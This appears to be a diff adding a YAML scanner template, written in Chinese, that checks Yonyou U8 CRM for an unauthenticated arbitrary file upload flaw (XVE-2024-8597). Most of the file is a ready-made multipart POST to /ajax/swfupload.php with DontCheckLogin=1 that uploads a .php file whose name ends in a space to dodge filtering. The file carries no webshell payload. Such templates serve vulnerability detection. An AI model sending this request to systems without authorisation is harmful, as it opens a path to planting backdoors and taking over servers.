@@ -1,0 +1,49 @@
+app: 用友软件
+query: app:"用友软件"
+meta:
+  name: 用友U8 CRM swfupload 任意文件上传漏洞复现(XVE-2024-8597)
+  level: 4
+  tags:
+  - file_upload
+  description: 用友 U8 CRM客户关系管理系统 swfupload 文件存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
+  homepage: ""
+  author: X prism
+  references: ""
+  solution: 关闭互联网暴露面或接口设置访问权限、级至安全版本
+  create_at: "2024-07-13 00:56:07"
+  available: false
+  steps:
+    variable: []
+    verify_steps:
+      type: and
+      verify:
+      - request:
+          method: POST
+          path: /ajax/swfupload.php?DontCheckLogin=1&vname=file
+          redirect: true
+          header:
+          - Content-Type: multipart/form-data;boundary=----269520967239406871642430066855
+          params: |-
+            ------269520967239406871642430066855
+            Content-Disposition: form-data; name="file"; filename="sssa.php "
+            Content-Type: application/octet-stream
+            ------269520967239406871642430066855
+            Content-Disposition: form-data; name="upload"
+            upload
+            ------269520967239406871642430066855--
+        response:
+        - name: code
+          value: "200"
+          type: equals
+        - name: body
+          value: '"success'
+          type: contains
+        - name: body
+          value: sssa.php
+          type: contains
+    exploit_steps:
+      type: ""
+      params:
+        name: ""
+        type: input
+        value: ""
